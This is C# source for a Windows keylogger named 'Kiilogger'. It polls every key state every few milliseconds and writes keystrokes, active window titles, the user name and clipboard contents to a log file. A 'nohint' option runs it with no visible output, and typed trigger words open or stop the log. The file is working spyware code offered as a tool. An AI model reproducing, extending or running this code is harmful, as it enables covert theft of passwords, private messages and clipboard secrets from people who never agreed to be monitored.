using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using System.Windows.Forms;
using System.Diagnostics;

namespace Kiilogger
{

    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetAsyncKeyState(int vkey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, String lpString, int nMaxCount);

        [DllImport("User32.dll")]
        static extern int SetForegroundWindow(IntPtr point);

        static string LogPath, Keyword;
        static System.Threading.Timer timer;
        static StreamWriter LogWriter;
        static bool KeepRunning = true;
        static bool Visible = true;
        static void Main(string[] args)
        {
            var ret = 0;
            if (args.Length == 0)
            {
                NotepadWriteLine(@"Pass ""nohint"" and ""path=PathToLogFile"" and ""keyword=keywordForKiilogger"" parameters");
            }
            else
            {
                bool pathSpecified = false;
                bool keywordSpecified = false;
                foreach (var arg in args)
                {
                    if (arg.ToLower() == "nohint")
                    {
                        Visible = false;
                    }
                    if (arg.ToLower().StartsWith("path=") && arg.Length > 5)
                    {
                        pathSpecified = true;
                        LogPath = arg.Substring(5);
                        NotepadWriteLine("Logging to path: " + LogPath);
                    }
                    else if (arg.ToLower().StartsWith("keyword=") && arg.Length > 7)
                    {
                        keywordSpecified = true;
                        Keyword = arg.Substring(8);
                        NotepadWriteLine("Get KiiLogger status: " + Keyword + "stat and Exit using: " + Keyword + "exit");
                    }
                }

                if (!pathSpecified)
                {
                    LogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KiilogX");
                    NotepadWriteLine("Path parameter not specified defaulting to: " + LogPath);
                }
                if (!keywordSpecified)
                {
                    Keyword = "KiiKey";
                    NotepadWriteLine("Keyword parameter not specified defaulting to: " + Keyword + "stat and " + Keyword + "exit");
                }
                LogWriter = new StreamWriter(LogPath, true);
                LogWriter.AutoFlush = true;
                BufferBuilder.Append("[Date::" + DateTime.Now.ToString() + "  Uname::" + System.Environment.UserName + ']');
                timer = new System.Threading.Timer(timer_tick, null, 0, 5);
                while (KeepRunning)
                {
                    Thread.Sleep(1000);
                }
                LogWriter.Dispose();
            }
        }
        static StringBuilder BufferBuilder = new StringBuilder(500);
        static string ClipText = string.Empty;

        private static void timer_tick(object state)
        {

            int x;
            int x2;
            int i;
            IntPtr win;
            //StringBuilder Title = new StringBuilder();
            win = GetForegroundWindow();

            String GetWindowTextBuffer;
            GetWindowTextBuffer = new string(Strings.Chr(0), 100);
            GetWindowText(GetForegroundWindow(), GetWindowTextBuffer, 100);
            GetWindowTextBuffer = GetWindowTextBuffer.Substring(0, GetWindowTextBuffer.IndexOf(Strings.Chr(0)));
            if (GetWindowTextBuffer.Length>0 && !BufferBuilder.ToString().Contains(GetWindowTextBuffer))
            {
                BufferBuilder.Append(Environment.NewLine + "[:" + GetWindowTextBuffer + ']');
            }
            else
            {
                goto loglog;
            }

            return;
            loglog:

            for (i = 65; i <= 90; i++)
            {
                x = GetAsyncKeyState(i);
                x2 = GetAsyncKeyState(16);
                if (x == -32767)
                {
                    if (x2 == -32768)
                    {
                        BufferBuilder.Append(Strings.Chr(i));
                    }
                    else
                    {
                        BufferBuilder.Append(Strings.Chr(i + 32));
                    }
                }
            }
            for (i = 8; i <= 222; i++)
            {
                if (i == 65)
                    i = 91;
                x = GetAsyncKeyState(i);
                x2 = GetAsyncKeyState(16);
                if (x == -32767)
                {
                    switch (i)
                    {
                        case 96:
                        case 97:
                        case 98:
                        case 99:
                        case 100:
                        case 101:
                        case 102:
                        case 103:
                        case 104:
                        case 105:
                            BufferBuilder.Append("[Npad-" + (i - 96) + ']');
                            break;
                        case 48:
                            BufferBuilder.Append(x2 == -32768 ? ')' : '0');
                            break;
                        case 49:
                            BufferBuilder.Append(x2 == -32768 ? '!' : '1');
                            break;
                        case 50:
                            BufferBuilder.Append(x2 == -32768 ? '@' : '2');
                            break;
                        case 51:
                            BufferBuilder.Append(x2 == -32768 ? '#' : '3');
                            break;
                        case 52:
                            BufferBuilder.Append(x2 == -32768 ? '$' : '4');
                            break;
                        case 53:
                            BufferBuilder.Append(x2 == -32768 ? '%' : '5');
                            break;
                        case 54:
                            BufferBuilder.Append(x2 == -32768 ? '^' : '6');
                            break;
                        case 55:
                            BufferBuilder.Append(x2 == -32768 ? '&' : '7');
                            break;
                        case 56:
                            BufferBuilder.Append(x2 == -32768 ? '*' : '8');
                            break;
                        case 57:
                            BufferBuilder.Append(x2 == -32768 ? '(' : '9');
                            break;
                        case 112:
                            BufferBuilder.Append(" F1 ");
                            break;
                        case 113:
                            BufferBuilder.Append(" F2 ");
                            break;
                        case 114:
                            BufferBuilder.Append(" F3 ");
                            break;
                        case 115:
                            BufferBuilder.Append(" F4 ");
                            break;
                        case 116:
                            BufferBuilder.Append(" F5 ");
                            break;
                        case 117:
                            BufferBuilder.Append(" F6 ");
                            break;
                        case 118:
                            BufferBuilder.Append(" F7 ");
                            break;
                        case 119:
                            BufferBuilder.Append(" F8 ");
                            break;
                        case 120:
                            BufferBuilder.Append(" F9 ");
                            break;
                        case 121:
                            BufferBuilder.Append(" F10 ");
                            break;
                        case 122:
                            BufferBuilder.Append(" F11 ");
                            break;
                        case 123:
                            BufferBuilder.Append(" F12 ");
                            break;
                        case 220:
                            BufferBuilder.Append(x2 == -32768 ? '|' : '\\');
                            break;
                        case 188:
                            BufferBuilder.Append(x2 == -32768 ? '<' : ',');
                            break;
                        case 189:
                            BufferBuilder.Append(x2 == -32768 ? '_' : '-');
                            break;
                        case 190:
                            BufferBuilder.Append(x2 == -32768 ? '>' : '.');
                            break;
                        case 191:
                            BufferBuilder.Append(x2 == -32768 ? '?' : '/');
                            break;
                        case 187:
                            BufferBuilder.Append(x2 == -32768 ? '+' : '=');
                            break;
                        case 186:
                            BufferBuilder.Append(x2 == -32768 ? ':' : ';');
                            break;
                        case 222:
                            BufferBuilder.Append(x2 == -32768 ? Strings.Chr(34) : '\'');
                            break;
                        case 219:
                            BufferBuilder.Append(x2 == -32768 ? '{' : '[');
                            break;
                        case 221:
                            BufferBuilder.Append(x2 == -32768 ? '}' : ']');
                            break;
                        case 192:
                            BufferBuilder.Append(x2 == -32768 ? '~' : '`');
                            break;
                        case 8:
                            BufferBuilder.Append("[Bksp]");
                            break;
                        case 9:
                            BufferBuilder.Append("[Tab]");
                            break;
                        case 13:
                            BufferBuilder.Append(Environment.NewLine);
                            break;
                        case 17:
                            BufferBuilder.Append("[Ctrl]");
                            break;
                        case 18:
                            BufferBuilder.Append("[Alt]");
                            break;
                        case 19:
                            BufferBuilder.Append("[Pause]");
                            break;
                        case 20:
                            BufferBuilder.Append("[Cpslck]");
                            break;
                        case 27:
                            BufferBuilder.Append("[Esc]");
                            break;
                        case 32:
                            BufferBuilder.Append("[Spc]");
                            break;
                        case 33:
                            BufferBuilder.Append("[PgUp]");
                            break;
                        case 34:
                            BufferBuilder.Append("[PgDn]");
                            break;
                        case 35:
                            BufferBuilder.Append("[End]");
                            break;
                        case 36:
                            BufferBuilder.Append("[Home]");
                            break;
                        case 37:
                            BufferBuilder.Append("[←]");
                            break;
                        case 38:
                            BufferBuilder.Append("[↑]");
                            break;
                        case 39:
                            BufferBuilder.Append("[→]");
                            break;
                        case 40:
                            BufferBuilder.Append("[↓]");
                            break;
                        case 41:
                            BufferBuilder.Append("[Sel]");
                            break;
                        case 43:
                            BufferBuilder.Append("[Exec]");
                            break;
                        case 44:
                            BufferBuilder.Append("[PrtScr]");
                            break;
                        case 45:
                            BufferBuilder.Append("[Ins]");
                            break;
                        case 46:
                            BufferBuilder.Append("[Del]");
                            break;
                        case 47:
                            BufferBuilder.Append("[Help]");
                            break;
                        case 109:
                            BufferBuilder.Append("[N-]");
                            break;
                        case 106:
                            BufferBuilder.Append("[N*]");
                            break;
                        case 107:
                            BufferBuilder.Append("[N+]");
                            break;
                        case 111:
                            BufferBuilder.Append("[N/]");
                            break;
                        case 110:
                            BufferBuilder.Append("[N.]");
                            break;
                        case 91:
                        case 92:
                            BufferBuilder.Append("[Win]");
                            break;
                        case 2:
                            BufferBuilder.Append("[RMB]");
                            break;
                        case 1:
                            BufferBuilder.Append("[LMB]");
                            break;
                        case 4:
                            BufferBuilder.Append("[MMB]");
                            break;
                    }
                }
            }
            if (BufferBuilder.ToString().Contains(Keyword + "stat"))
            {
                Debug.Print("stat");
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
                Process.Start("notepad.exe", LogPath);
                //Show();

            }
            if (BufferBuilder.ToString().Contains(Keyword + "exit"))
            {
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
                Exit();
            }
            // Below, when the Log gets to be over 128 we write it to the text file that we 
            // have selected from before.
            if (Clipboard.ContainsText())
            {
                if (!(Clipboard.GetText() == ClipText))
                {
                    ClipText = Clipboard.GetText();
                    BufferBuilder.Append("[Clipboard::" + ClipText + ']');
                }
            }
            if (BufferBuilder.Length > 400)
            {
                LogToFile(BufferBuilder.ToString());
                BufferBuilder.Clear();
            }
        }

        private static void LogToFile(string bufferText)
        {
            LogWriter.WriteLine(bufferText);
        }

        private static void Exit()
        {
            KeepRunning = false;
            Console.Beep();
            Console.Beep();
            Console.Beep();
        }

        private static void Show()
        {
            if (!Visible)
            {
                Visible = true;
                //Console.SetOut(new StreamWriter(Console.OpenStandardOutput()));
                NotepadWriteLine("KiiLogger is running."
                    + Environment.NewLine + "Log saved at " + LogPath);
            }
        }

        private static void NotepadWriteLine(string bufferText)
        {
            if (Visible)
            {
                Process p = Process.GetProcessesByName("notepad").FirstOrDefault();
                if (p == null)
                {
                    p = Process.Start("notepad.exe");
                    p.WaitForInputIdle();
                }
                IntPtr h = p.MainWindowHandle;
                SetForegroundWindow(h);
                SendKeys.SendWait(bufferText + Environment.NewLine);
            }
        }
    }
}
